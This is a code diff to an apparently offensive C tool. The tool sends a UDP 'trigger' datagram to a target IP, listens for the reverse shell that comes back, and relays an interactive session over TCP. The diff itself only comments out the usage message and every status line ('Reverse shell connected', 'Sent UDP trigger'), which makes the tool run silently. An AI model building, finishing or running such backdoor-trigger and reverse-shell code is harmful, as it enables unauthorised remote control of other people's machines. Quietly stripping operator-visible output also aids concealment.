@@ -12,7 +12,7 @@
 
 int main(int argc, char *argv[]) {
     if (argc < 2) {
-        fprintf(stderr, "Usage: %s <target_ip> [port]\n", argv[0]);
+        // fprintf(stderr, "Usage: %s <target_ip> [port]\n", argv[0]);
         return 1;
     }
 
@@ -47,7 +47,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    printf("[*] Listener bound to 0.0.0.0:%d. Waiting for connection from %s...\n", port, target_ip);
+    // printf("[*] Listener bound to 0.0.0.0:%d. Waiting for connection from %s...\n", port, target_ip);
 
     /* 2. Send UDP trigger datagram to $TARGET_IP */
     int udp_fd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -60,7 +60,7 @@ int main(int argc, char *argv[]) {
 
         sendto(udp_fd, TRIGGER_STRING, strlen(TRIGGER_STRING), 0,
                (struct sockaddr *)&target_addr, sizeof(target_addr));
-        printf("[*] Sent UDP trigger datagram to %s:%d\n", target_ip, port);
+        // printf("[*] Sent UDP trigger datagram to %s:%d\n", target_ip, port);
         close(udp_fd);
     } else {
         perror("socket (UDP trigger)");
@@ -78,7 +78,7 @@ int main(int argc, char *argv[]) {
 
     char client_ip[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
-    printf("[+] Reverse shell connected from %s:%d!\n\n", client_ip, ntohs(client_addr.sin_port));
+    // printf("[+] Reverse shell connected from %s:%d!\n\n", client_ip, ntohs(client_addr.sin_port));
 
     /* 4. Interactive loop bridging stdin/stdout <-> TCP socket */
     fd_set fds;
@@ -108,6 +108,6 @@ int main(int argc, char *argv[]) {
 
     close(conn_fd);
     close(listen_fd);
-    printf("\n[*] Connection closed.\n");
+    // printf("\n[*] Connection closed.\n");
     return 0;
 }
